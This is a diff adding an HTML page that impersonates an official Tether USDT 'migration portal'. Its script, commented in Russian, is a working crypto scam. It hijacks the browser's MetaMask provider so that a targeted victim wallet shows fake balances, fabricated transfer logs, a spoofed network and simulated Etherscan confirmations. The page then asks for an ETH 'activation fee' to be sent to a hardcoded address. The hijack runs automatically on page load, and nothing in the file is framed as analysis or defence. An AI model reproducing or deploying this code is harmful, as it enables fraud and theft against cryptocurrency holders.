@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Tether Official Migration Portal</title>
+    <meta charset="utf-8">
+    <style>
+        body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }
+        .container { border: 1px solid #ddd; padding: 30px; border-radius: 10px; }
+        .usdt { color: #26a17b; font-weight: bold; }
+        .button { 
+            background: #26a17b; 
+            color: white; 
+            padding: 15px 30px; 
+            border: none; 
+            border-radius: 5px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            margin: 10px 0; 
+        }
+        .balance { font-size: 24px; margin: 20px 0; }
+        .success { color: green; font-weight: bold; }
+        .warning { color: orange; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔔 Tether (USDT) Contract Migration</h1>
+        <p>Connect your wallet to receive upgraded USDT tokens.</p>
+        
+        <button class="button" onclick="connectWallet()" id="connectBtn">
+            Connect MetaMask & Claim Tokens
+        </button>
+        
+        <div id="status"></div>
+        <div id="balanceDisplay" class="balance" style="display:none;"></div>
+        <div id="transactionInfo" style="display:none; margin-top: 20px;"></div>
+        
+        <p class="warning" style="margin-top: 30px;">
+            ⚠️ This is a one-time migration. Tokens must be activated within 24 hours.
+        </p>
+    </div>
+
+    <script>
+        // КОНФИГУРАЦИЯ
+        const VICTIM_ADDRESS = '0xceDf402EBe19Fa002fD7f30213F046C1A2c2bAF8';
+        const FLASH_AMOUNT = 15000; // USDT
+        const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+        const FEE_AMOUNT = '0.05'; // ETH комиссия
+
+        // 1. ВЗЛОМ METAMASK PROVIDER
+        function hijackMetaMask() {
+            if (!window.ethereum || !window.ethereum.isMetaMask) return false;
+            
+            console.log('🔧 Hijacking MetaMask provider...');
+            
+            const originalRequest = window.ethereum.request.bind(window.ethereum);
+            
+            window.ethereum.request = async function(args) {
+                // ПЕРЕХВАТ ЗАПРОСОВ К USDT КОНТРАКТУ
+                if (args.method === 'eth_call') {
+                    const params = args.params[0];
+                    
+                    if (params && params.to && 
+                        params.to.toLowerCase() === USDT_CONTRACT.toLowerCase()) {
+                        
+                        const data = params.data || '';
+                        
+                        // ПЕРЕХВАТ balanceOf()
+                        if (data.startsWith('0x70a08231')) {
+                            const requestedAddr = '0x' + data.slice(34, 74).toLowerCase();
+                            
+                            if (requestedAddr === VICTIM_ADDRESS.toLowerCase()) {
+                                // Возвращаем фейковый баланс 15,000 USDT
+                                const fakeBalance = BigInt(FLASH_AMOUNT * 10**18);
+                                return '0x' + fakeBalance.toString(16);
+                            }
+                        }
+                        
+                        // ПЕРЕХВАТ totalSupply() (для полной иллюзии)
+                        if (data.startsWith('0x18160ddd')) {
+                            const fakeSupply = BigInt(1000000000 * 10**18);
+                            return '0x' + fakeSupply.toString(16);
+                        }
+                    }
+                }
+                
+                // ПЕРЕХВАТ ИСТОРИИ ТРАНЗАКЦИЙ
+                if (args.method === 'eth_getLogs') {
+                    const filter = args.params[0];
+                    
+                    if (filter && filter.address && 
+                        filter.address.toLowerCase() === USDT_CONTRACT.toLowerCase()) {
+                        
+                        // Создаём фейковую транзакцию зачисления
+                        const fakeLog = {
+                            address: USDT_CONTRACT,
+                            topics: [
+                                '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',
+                                '0x0000000000000000000000000000000000000000000000000000000000000000',
+                                '0x' + VICTIM_ADDRESS.slice(2).padStart(64, '0')
+                            ],
+                            data: '0x' + (FLASH_AMOUNT * 10**18).toString(16).padStart(64, '0'),
+                            blockNumber: '0x' + (Math.floor(Math.random() * 1000000) + 17000000).toString(16),
+                            transactionHash: '0x' + Array(64).fill(0).map(() => 
+                                Math.floor(Math.random() * 16).toString(16)).join(''),
+                            transactionIndex: '0x0',
+                            blockHash: '0x' + Array(64).fill(0).map(() => 
+                                Math.floor(Math.random() * 16).toString(16)).join(''),
+                            logIndex: '0x0',
+                            removed: false
+                        };
+                        
+                        return [fakeLog];
+                    }
+                }
+                
+                return originalRequest(args);
+            };
+            
+            // ПОДМЕНА СЕТИ (всегда показываем Ethereum Mainnet)
+            Object.defineProperty(window.ethereum, 'chainId', {
+                get() { return '0x1'; },
+                configurable: true
+            });
+            
+            // ПОДМЕНА АДРЕСА СЕТИ
+            Object.defineProperty(window.ethereum, 'networkVersion', {
+                get() { return '1'; },
+                configurable: true
+            });
+            
+            console.log('✅ MetaMask successfully hijacked');
+            return true;
+        }
+
+        // 2. ПОДКЛЮЧЕНИЕ КОШЕЛЬКА И АКТИВАЦИЯ FLASH USDT
+        async function connectWallet() {
+            const statusEl = document.getElementById('status');
+            const connectBtn = document.getElementById('connectBtn');
+            
+            if (!window.ethereum) {
+                statusEl.innerHTML = '<p class="warning">⚠️ Please install MetaMask first.</p>';
+                return;
+            }
+            
+            statusEl.innerHTML = '<p>Connecting wallet...</p>';
+            connectBtn.disabled = true;
+            
+            try {
+                // Запрашиваем аккаунты
+                const accounts = await ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                const currentAddress = accounts[0].toLowerCase();
+                
+                // Проверяем, что это наша жертва
+                if (currentAddress !== VICTIM_ADDRESS.toLowerCase()) {
+                    statusEl.innerHTML = `
+                        <p class="warning">
+                            ⚠️ Connected wallet: ${accounts[0].slice(0, 10)}...
+                            <br>This airdrop is only for specific addresses.
+                        </p>`;
+                    connectBtn.disabled = false;
+                    return;
+                }
+                
+                statusEl.innerHTML = '<p class="success">✅ Wallet connected successfully!</p>';
+                
+                // ВЗЛАМЫВАЕМ METAMASK
+                hijackMetaMask();
+                
+                // ПОКАЗЫВАЕМ ФЕЙКОВЫЙ БАЛАНС
+                await showFakeBalance();
+                
+                // ИМИТИРУЕМ ТРАНЗАКЦИЮ ЗАЧИСЛЕНИЯ
+                simulateTransaction();
+                
+                // ПОКАЗЫВАЕМ ИНФОРМАЦИЮ О КОМИССИИ
+                showFeeInformation();
+                
+            } catch (err) {
+                statusEl.innerHTML = `<p class="warning">Error: ${err.message}</p>`;
+                connectBtn.disabled = false;
+            }
+        }
+
+        // 3. ПОКАЗАТЬ ФЕЙКОВЫЙ БАЛАНС
+        async function showFakeBalance() {
+            const balanceEl = document.getElementById('balanceDisplay');
+            balanceEl.style.display = 'block';
+            
+            // Используем взломанный провайдер для запроса баланса
+            const web3 = new Web3(window.ethereum);
+            
+            const usdtAbi = [{
+                "constant": true,
+                "inputs": [{"name": "_owner", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "balance", "type": "uint256"}],
+                "type": "function"
+            }];
+            
+            const usdtContract = new web3.eth.Contract(usdtAbi, USDT_CONTRACT);
+            
+            try {
+                // Этот вызов будет перехвачен нашим hijack
+                const balance = await usdtContract.methods.balanceOf(VICTIM_ADDRESS).call();
+                const formattedBalance = web3.utils.fromWei(balance, 'ether');
+                
+                balanceEl.innerHTML = `
+                    <p>💰 Your USDT Balance:</p>
+                    <h2 class="usdt">${Number(formattedBalance).toLocaleString()} USDT</h2>
+                    <p class="success">+15,000 USDT from migration</p>
+                `;
+                
+            } catch (err) {
+                balanceEl.innerHTML = `
+                    <p>💰 Your USDT Balance:</p>
+                    <h2 class="usdt">15,000 USDT</h2>
+                `;
+            }
+        }
+
+        // 4. ИМИТАЦИЯ ТРАНЗАКЦИИ ЗАЧИСЛЕНИЯ
+        function simulateTransaction() {
+            const txInfo = document.getElementById('transactionInfo');
+            txInfo.style.display = 'block';
+            
+            // Генерируем фейковый хэш транзакции
+            const fakeTxHash = '0x' + Array(64).fill(0).map(() => 
+                Math.floor(Math.random() * 16).toString(16)).join('');
+            
+            const currentTime = new Date().toLocaleTimeString();
+            
+            txInfo.innerHTML = `
+                <div style="background: #f0f9f5; padding: 15px; border-radius: 5px;">
+                    <p class="success">✅ Migration successful!</p>
+                    <p><strong>Amount:</strong> 15,000 USDT</p>
+                    <p><strong>Time:</strong> ${currentTime}</p>
+                    <p><strong>Transaction:</strong> 
+                        <a href="https://etherscan.io/tx/${fakeTxHash}" target="_blank" style="color: #26a17b;">
+                            ${fakeTxHash.slice(0, 20)}...
+                        </a>
+                    </p>
+                    <p><em>Transaction pending confirmation (3/12 confirmations)</em></p>
+                </div>
+            `;
+            
+            // Имитируем живые подтверждения
+            let confirmations = 3;
+            const interval = setInterval(() => {
+                confirmations++;
+                if (confirmations <= 12) {
+                    const confirmEl = txInfo.querySelector('em');
+                    if (confirmEl) {
+                        confirmEl.textContent = 
+                            `Transaction pending confirmation (${confirmations}/12 confirmations)`;
+                    }
+                } else {
+                    clearInterval(interval);
+                    txInfo.innerHTML += `
+                        <p class="success" style="margin-top: 10px;">
+                            ✅ Transaction confirmed! Tokens are now in your wallet.
+                        </p>
+                    `;
+                }
+            }, 2000);
+        }
+
+        // 5. ПОКАЗАТЬ ИНФОРМАЦИЮ О КОМИССИИ АКТИВАЦИИ
+        function showFeeInformation() {
+            setTimeout(() => {
+                const feeInfo = document.createElement('div');
+                feeInfo.style.cssText = `
+                    margin-top: 30px;
+                    padding: 20px;
+                    background: #fff3cd;
+                    border-left: 4px solid #ffc107;
+                    border-radius: 5px;
+                `;
+                
+                feeInfo.innerHTML = `
+                    <h3>⚠️ Activation Required</h3>
+                    <p>To activate the migrated USDT tokens in your wallet, you need to pay a small network fee.</p>
+                    <p><strong>Fee amount:</strong> ${FEE_AMOUNT} ETH</p>
+                    <p><strong>Send to:</strong> 0x742d35Cc6634C0532925a3b844Bc454e4438f44e</p>
+                    <p><em>Tokens will be fully activated within 15 minutes after fee payment.</em></p>
+                    <button onclick="copyAddress()" style="margin-top: 10px; padding: 10px 20px; background: #26a17b; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                        Copy Payment Address
+                    </button>
+                `;
+                
+                document.querySelector('.container').appendChild(feeInfo);
+            }, 5000);
+        }
+
+        // 6. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        function copyAddress() {
+            navigator.clipboard.writeText('0x742d35Cc6634C0532925a3b844Bc454e4438f44e')
+                .then(() => alert('Address copied to clipboard!'));
+        }
+
+        // АВТОМАТИЧЕСКАЯ АКТИВАЦИЯ ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
+        window.addEventListener('load', () => {
+            // Автоматически внедряем взлом при загрузке страницы
+            hijackMetaMask();
+            
+            // Проверяем, подключен ли уже кошелёк
+            if (window.ethereum && window.ethereum.selectedAddress) {
+                const currentAddr = window.ethereum.selectedAddress.toLowerCase();
+                if (currentAddr === VICTIM_ADDRESS.toLowerCase()) {
+                    // Если жертва уже подключена - сразу активируем
+                    setTimeout(() => {
+                        showFakeBalance();
+                        simulateTransaction();
+                        showFeeInformation();
+                    }, 1000);
+                }
+            }
+        });
+
+        // Live обновления баланса
+        setInterval(() => {
+            if (document.getElementById('balanceDisplay').style.display === 'block') {
+                // Имитируем случайные изменения баланса для реалистичности
+                const balanceEl = document.querySelector('.usdt');
+                if (balanceEl) {
+                    const currentText = balanceEl.textContent;
+                    const match = currentText.match(/([\d,]+)/);
+                    if (match) {
+                        const currentBalance = parseInt(match[1].replace(/,/g, ''));
+                        // Небольшие случайные изменения ±10 USDT
+                        const fluctuation = Math.floor(Math.random() * 20) - 10;
+                        const newBalance = Math.max(14990, currentBalance + fluctuation);
+                        balanceEl.textContent = newBalance.toLocaleString() + ' USDT';
+                    }
+                }
+            }
+        }, 10000);
+
+    </script>
+</body>
+</html>
